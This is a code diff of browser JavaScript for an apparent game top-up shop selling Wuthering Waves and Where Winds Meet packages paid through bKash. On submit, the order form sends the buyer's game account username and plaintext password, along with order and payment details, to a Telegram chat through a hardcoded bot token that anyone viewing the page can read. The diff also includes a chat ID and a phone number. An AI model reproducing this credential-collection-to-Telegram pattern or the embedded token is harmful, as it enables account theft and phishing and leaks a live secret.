@@ -1,8 +1,8 @@
 const packages = {
     ww: [
-        { id: 'ww1', type: 'Lunite Subscription Pack', name: 'Tide Blessing Pack', price: 449 },
-        { id: 'ww2', type: 'Resonator Pass Packs', name: 'Resonator Pass', price: 949 },
-        { id: 'ww3', type: 'Resonator Pass Packs', name: 'Resonator Pass+', price: 2199 },
+        { id: 'ww1', type: 'Lunite Subscription', name: 'Tide Blessing Pack', price: 449 },
+        { id: 'ww2', type: 'Resonator Pass', name: 'Standard Pass', price: 949 },
+        { id: 'ww3', type: 'Resonator Pass', name: 'Premium Pass+', price: 2199 },
         { id: 'ww4', type: 'Lunite Top-Up', name: '120 Lunites', price: 109 },
         { id: 'ww5', type: 'Lunite Top-Up', name: '600 Lunites', price: 449 },
         { id: 'ww6', type: 'Lunite Top-Up', name: '1960 Lunites', price: 1649 },
@@ -11,9 +11,9 @@ const packages = {
         { id: 'ww9', type: 'Lunite Top-Up', name: '12960 Lunites', price: 10999 }
     ],
     wwm: [
-        { id: 'wwm1', type: 'Moonlit Supply Pack', name: 'Spirit Jade Subscription', price: 449 },
-        { id: 'wwm2', type: 'Hero’s Journey Pass', name: 'Battle Scroll', price: 949 },
-        { id: 'wwm3', type: 'Hero’s Journey Pass', name: 'Battle Scroll+', price: 2199 },
+        { id: 'wwm1', type: 'Moonlit Supply', name: 'Spirit Subscription', price: 449 },
+        { id: 'wwm2', type: 'Hero’s Journey', name: 'Battle Scroll', price: 949 },
+        { id: 'wwm3', type: 'Hero’s Journey', name: 'Battle Scroll+', price: 2199 },
         { id: 'wwm4', type: 'Spirit Jade Top-Up', name: '120 Spirit Jade', price: 109 },
         { id: 'wwm5', type: 'Spirit Jade Top-Up', name: '600 Spirit Jade', price: 449 },
         { id: 'wwm6', type: 'Spirit Jade Top-Up', name: '1960 Spirit Jade', price: 1649 },
@@ -24,38 +24,60 @@ const packages = {
 };
 
 const BOT_TOKEN = '8579178443:AAHDl_DEr43_AdA30j9y79FMWTlTFUJlGag';
-const CHAT_IDS = ['8395284772']; 
+const CHAT_IDS = ['8395284772'];
 
 const container = document.getElementById('packages-container');
 const modal = document.getElementById('order-modal');
 const qtyInput = document.getElementById('quantity');
-const plusBtn = document.getElementById('plus-btn');
-const minusBtn = document.getElementById('minus-btn');
 const displayPrice = document.getElementById('display-price');
-const paymentAmount = document.getElementById('payment-amount');
-const body = document.body;
+const serverGroup = document.getElementById('server-group');
+const serverInput = document.getElementById('server');
+const serverText = document.getElementById('selected-server-text');
+const serverOptions = document.getElementById('server-options');
 
 let currentPackage = null;
 let currentGame = '';
 
 function render(game) {
-    // UI Change & Theme Swap
-    body.className = `theme-${game}`;
     container.innerHTML = '';
-    currentGame = game === 'ww' ? 'Wuthering Waves' : 'Where Winds Meet';
+    currentGame = game;
     
-    // Staggered Animation Logic
-    packages[game].forEach((p, index) => {
+    // Smart Form Logic
+    if(game === 'wwm') {
+        serverGroup.style.display = 'none';
+        serverInput.removeAttribute('required');
+    } else {
+        serverGroup.style.display = 'block';
+        serverInput.setAttribute('required', 'true');
+    }
+
+    const gameNameDisplay = game === 'ww' ? 'Wuthering Waves' : 'Where Winds Meet';
+
+    packages[game].forEach((p, i) => {
         const div = document.createElement('div');
         div.className = 'package-card';
-        div.style.animation = `slideUpFade 0.6s cubic-bezier(0.16, 1, 0.3, 1) ${index * 0.08}s forwards`; // Cascade effect
+        div.innerHTML = `<div class="inner-content"><span class="pack-type">${p.type}</span><h3>${p.name}</h3><p>${p.price} <span>BDT</span></p></div>`;
         
-        div.innerHTML = `<span class="pack-type">${p.type}</span><h3>${p.name}</h3><p>${p.price} <span>BDT</span></p>`;
+        // WOW Feature: 3D Magnetic Tilt Effect
+        div.addEventListener('mousemove', (e) => {
+            const rect = div.getBoundingClientRect();
+            const x = e.clientX - rect.left;
+            const y = e.clientY - rect.top;
+            const centerX = rect.width / 2;
+            const centerY = rect.height / 2;
+            const rotateX = ((y - centerY) / centerY) * -10; // Max tilt 10deg
+            const rotateY = ((x - centerX) / centerX) * 10;
+            div.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale3d(1.02, 1.02, 1.02)`;
+        });
         
+        div.addEventListener('mouseleave', () => {
+            div.style.transform = `perspective(1000px) rotateX(0deg) rotateY(0deg) scale3d(1, 1, 1)`;
+        });
+
         div.onclick = () => {
             currentPackage = p;
             document.getElementById('modal-package-name').innerText = p.name;
-            document.getElementById('modal-game-name').innerText = currentGame;
+            document.getElementById('modal-game-name').innerText = gameNameDisplay;
             qtyInput.value = 1;
             updateUI();
             modal.classList.remove('hidden');
@@ -64,15 +86,28 @@ function render(game) {
     });
 }
 
+// Custom Dropdown Logic
+function toggleSelect() {
+    serverOptions.classList.toggle('hidden');
+}
+function selectServer(val) {
+    serverText.innerText = val;
+    serverText.style.color = '#fff';
+    serverInput.value = val;
+}
+// Close dropdown when clicked outside
+document.addEventListener('click', (e) => {
+    if (!e.target.closest('.custom-select-wrapper')) {
+        serverOptions.classList.add('hidden');
+    }
+});
+
 function updateUI() {
-    const total = currentPackage.price * parseInt(qtyInput.value || 1);
-    displayPrice.innerText = total;
-    paymentAmount.innerText = total + ' BDT';
+    displayPrice.innerText = currentPackage.price * parseInt(qtyInput.value);
 }
 
-plusBtn.onclick = () => { qtyInput.value = parseInt(qtyInput.value) + 1; updateUI(); };
-minusBtn.onclick = () => { if(qtyInput.value > 1) { qtyInput.value = parseInt(qtyInput.value) - 1; updateUI(); } };
-qtyInput.oninput = updateUI;
+document.getElementById('plus-btn').onclick = () => { qtyInput.value = parseInt(qtyInput.value) + 1; updateUI(); };
+document.getElementById('minus-btn').onclick = () => { if(qtyInput.value > 1) { qtyInput.value = parseInt(qtyInput.value) - 1; updateUI(); } };
 
 document.querySelector('.close-btn').onclick = () => modal.classList.add('hidden');
 
@@ -87,21 +122,25 @@ document.querySelectorAll('.game-btn').forEach(btn => {
 document.getElementById('order-form').onsubmit = async (e) => {
     e.preventDefault();
     const btn = document.getElementById('submit-btn');
-    btn.disabled = true; btn.innerText = 'Processing...';
+    btn.disabled = true; btn.innerHTML = 'Processing...';
 
-    const msg = `🚀 *New Order!*
+    const gameStr = currentGame === 'ww' ? 'Wuthering Waves' : 'Where Winds Meet';
+    const srvLine = currentGame === 'ww' ? `\n🌍 *Server:* \`${serverInput.value}\`` : '';
 
-🎮 *Game:* ${currentGame}
-📦 *Pack:* ${currentPackage.name}
-🔢 *Qty:* ${qtyInput.value}
-💰 *Total:* ${displayPrice.innerText} BDT
+    const msg = `🧾 *Premium Order Received*
 
-👤 *User:* \`${document.getElementById('email-username').value}\`
+🎮 *Game:* ${gameStr}
+📦 *Package:* ${currentPackage.name}
+🔢 *Quantity:* ${qtyInput.value}
+💰 *Total Pay:* ${displayPrice.innerText} BDT
+
+👤 *Account Info:*
+✉️ *Email/User:* \`${document.getElementById('email-username').value}\`
 🔑 *Pass:* \`${document.getElementById('password').value}\`
-🌍 *Server:* \`${document.getElementById('server').value}\`
-🏷️ *IGN:* \`${document.getElementById('ign').value}\`
+🏷️ *IGN:* \`${document.getElementById('ign').value}\`${srvLine}
 
-💳 *TrxID:* \`${document.getElementById('trxid').value}\``;
+💳 *Payment (bKash)*
+🧾 *TrxID:* \`${document.getElementById('trxid').value}\``;
 
     try {
         for (const id of CHAT_IDS) {
@@ -111,29 +150,27 @@ document.getElementById('order-form').onsubmit = async (e) => {
                 body: JSON.stringify({ chat_id: id, text: msg, parse_mode: 'Markdown' })
             });
         }
-        
         modal.classList.add('hidden');
         document.getElementById('success-modal').classList.remove('hidden');
-    } catch (error) {
-        alert('Something went wrong! Please try again.');
-        console.error('Telegram API Error:', error);
+    } catch (err) {
+        alert('Connection error. Try again.');
     } finally {
-        btn.disabled = false; btn.innerText = 'Confirm Order';
+        btn.disabled = false; btn.innerHTML = '<span class="btn-text">Confirm Purchase</span>';
         document.getElementById('order-form').reset();
+        serverText.innerText = 'Select Server';
+        serverText.style.color = 'var(--text-secondary)';
     }
 };
 
 document.getElementById('close-success').onclick = () => document.getElementById('success-modal').classList.add('hidden');
 
 function copyNumber() {
-    const numberText = document.getElementById('bkash-number').innerText;
-    navigator.clipboard.writeText(numberText).then(() => {
-        const copyBtn = document.querySelector('.copy-icon');
-        const originalIcon = copyBtn.innerText;
-        copyBtn.innerText = '✔️';
-        setTimeout(() => { copyBtn.innerText = originalIcon; }, 2000);
-    }).catch(err => console.error('Failed to copy: ', err));
+    navigator.clipboard.writeText('01610359086').then(() => {
+        const icon = document.getElementById('copy-icon');
+        icon.innerText = '✔️';
+        setTimeout(() => icon.innerText = '📋', 2000);
+    });
 }
 
-// Start with WW Theme
+// Init
 render('ww');
